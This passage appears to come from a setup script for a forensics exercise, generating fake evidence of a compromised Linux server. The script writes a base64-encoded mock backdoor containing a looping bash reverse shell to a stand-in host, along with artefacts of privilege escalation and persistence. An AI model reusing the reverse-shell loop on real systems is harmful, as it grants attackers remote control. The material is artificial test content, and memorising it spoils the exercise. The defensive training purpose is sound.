# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo\tALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:
@includedir /etc/sudoers.d
""")

    # === NETSTAT SNAPSHOT ===
    write("network/netstat_snapshot.txt", """Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      892/sshd: /usr/sbin
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1102/apache2
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      1089/mysqld
tcp        0      0 10.0.0.100:80           10.0.0.12:54231         ESTABLISHED 1205/apache2
tcp        0      0 10.0.0.100:80           10.0.0.25:38912         ESTABLISHED 1206/apache2
tcp        0      0 10.0.0.100:42198        203.0.113.89:4444       ESTABLISHED 2501/bash
tcp        0      0 10.0.0.100:51200        192.0.2.100:8443        ESTABLISHED 2502/backdoor
tcp        0      0 10.0.0.100:22           198.51.100.47:49832     ESTABLISHED 3156/sshd: root
tcp        0      0 10.0.0.100:22           10.0.0.5:52890          TIME_WAIT   -
tcp6       0      0 :::22                   :::*                    LISTEN      892/sshd: /usr/sbin
tcp6       0      0 :::80                   :::*                    LISTEN      1102/apache2
udp        0      0 0.0.0.0:68              0.0.0.0:*                           534/systemd-network
""")

    # === IPTABLES RULES ===
    write("network/iptables_rules.txt", """# Generated by iptables-save v1.8.7 on Fri Mar 15 03:15:00 2024
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
-A INPUT -p tcp -m tcp --dport 443 -j ACCEPT
-A INPUT -p icmp -j ACCEPT
-A INPUT -j DROP
COMMIT
# Note: No egress filtering configured - all outbound traffic allowed
""")

    # === MALWARE - backdoor script (base64 encoded) ===
    backdoor_script = """#!/bin/bash
# System cache update utility
# Installed: 2024-03-15
while true; do
    bash -i >& /dev/tcp/203.0.113.89/4444 0>&1
    sleep 300
done
"""
    b64_encoded = base64.b64encode(backdoor_script.encode()).decode()
    write("malware/cache_update.b64", b64_encoded + "\n")

    # === Copy compiled backdoor binary ===
    backdoor_src = "/tmp/backdoor"
    backdoor_dst = os.path.join(EVIDENCE_ROOT, "malware/backdoor")
    if os.path.exists(backdoor_src):
        shutil.copy2(backdoor_src, backdoor_dst)
        os.chmod(backdoor_dst, 0o755)

    # === MALWARE HASHES ===
    script_md5 = hashlib.md5(backdoor_script.encode()).hexdigest()
    script_sha256 = hashlib.sha256(backdoor_script.encode()).hexdigest()

    binary_hashes = ""
    if os.path.exists(backdoor_dst):
        with open(backdoor_dst, "rb") as f:
            binary_data = f.read()
        bin_md5 = hashlib.md5(binary_data).hexdigest()
        bin_sha256 = hashlib.sha256(binary_data).hexdigest()
        binary_hashes = f"""
File: /usr/local/bin/backdoor (compiled ELF)
MD5:    {bin_md5}
SHA256: {bin_sha256}
Size:   {len(binary_data)} bytes
Type:   ELF 64-bit LSB executable, x86-64
Note:   Found running as PID 2502, persistent beacon process
"""

    write("malware/hashes.txt", f"""File: /usr/local/bin/.cache_update (bash script)
MD5:    {script_md5}
SHA256: {script_sha256}
Size:   {len(backdoor_script)} bytes
Type:   Bourne-Again shell script, ASCII text executable
Note:   File had hidden name (leading dot), executable permissions, owned by root
{binary_hashes}""")

    # === FILESYSTEM MODIFICATIONS TIMELINE ===
    write("filesystem/recent_modifications.txt", """# find / -newer /tmp/marker_20240315_0200 -not -path '/proc/*' -not -path '/sys/*' -not -path '/run/*' -not -path '/dev/*' -printf '%T+ %m %u:%g %p\\n' 2>/dev/null | sort
2024-03-15+02:00:02.000 644 root:root /var/log/syslog
2024-03-15+02:00:02.000 644 root:root /var/log/auth.log
2024-03-15+02:15:42.102 755 www-data:www-data /tmp/sess_a8f3k2m1
2024-03-15+02:15:44.234 755 www-data:www-data /dev/shm/.x
2024-03-15+02:18:33.891 755 root:root /tmp/.pwnkit
2024-03-15+02:20:31.445 644 root:root /etc/passwd
2024-03-15+02:20:31.446 640 root:shadow /etc/shadow
2024-03-15+02:21:15.112 700 root:root /root/.ssh
2024-03-15+02:21:15.223 600 root:root /root/.ssh/authorized_keys
2024-03-15+02:22:08.334 755 root:root /usr/local/bin/.cache_update
2024-03-15+02:22:08.400 755 root:root /usr/local/bin/backdoor
2024-03-15+02:22:08.567 600 root:root /var/spool/cron/crontabs/root
2024-03-15+02:23:45.789 644 root:root /etc/pam.d/common-auth
2024-03-15+02:25:12.901 600 root:root /tmp/.db_dump.sql
2024-03-15+02:28:00.123 640 root:adm /var/log/auth.log.1
2024-03-15+02:28:00.234 644 root:root /root/.bash_history
""")

    # === PROCESS LIST SNAPSHOT ===
    write("system/ps_snapshot.txt", """USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 167272 11892 ?        Ss   Mar14   0:03 /sbin/init
root         534  0.0  0.2  90316  6324 ?        Ss   Mar14   0:00 /lib/systemd/systemd-networkd
root         682  0.0  0.1  24020  5432 ?        Ss   Mar14   0:00 /lib/systemd/systemd-logind
root         892  0.0  0.1  15420  5584 ?        Ss   Mar14   0:00 sshd: /usr/sbin/sshd -D
mysql       1089  0.1  4.2 1840896 174212 ?      Ssl  Mar14   0:45 /usr/sbin/mysqld
root        1102  0.0  0.2  78076  8744 ?        Ss   01:00   0:00 /usr/sbin/apache2 -k start
www-data    1205  0.0  0.4 1146104 16892 ?       Sl   01:00   0:02 /usr/sbin/apache2 -k start
www-data    1206  0.0  0.3 1146104 14520 ?       Sl   01:00   0:01 /usr/sbin/apache2 -k start
www-data    2501  0.0  0.1   7388  3984 ?        S    02:15   0:00 bash
root        2502  0.0  0.1   3200  1800 ?        S    02:22   0:00 /usr/local/bin/backdoor
root        2734  0.0  0.1   7620  4200 ?        S    02:18   0:00 su -
root        2735  0.0  0.1   8064  4892 ?        S    02:18   0:00 bash
root        3156  0.0  0.1  16808  7244 ?        Ss   02:35   0:00 sshd: root [priv]
root        3162  0.0  0.1   8960  4124 ?        S    02:35   0:00 -bash
root        3201  0.0  0.0   6332  2460 ?        S    03:15   0:00 ps aux
""")

    # === GENERATE PCAP ===
    generate_pcap()

    os.makedirs("/app/report", exist_ok=True)

    print("Evidence generation complete.")
    print(f"Evidence root: {EVIDENCE_ROOT}")
    print(f"Directories: {sorted(os.listdir(EVIDENCE_ROOT))}")


if __name__ == "__main__":
    main()
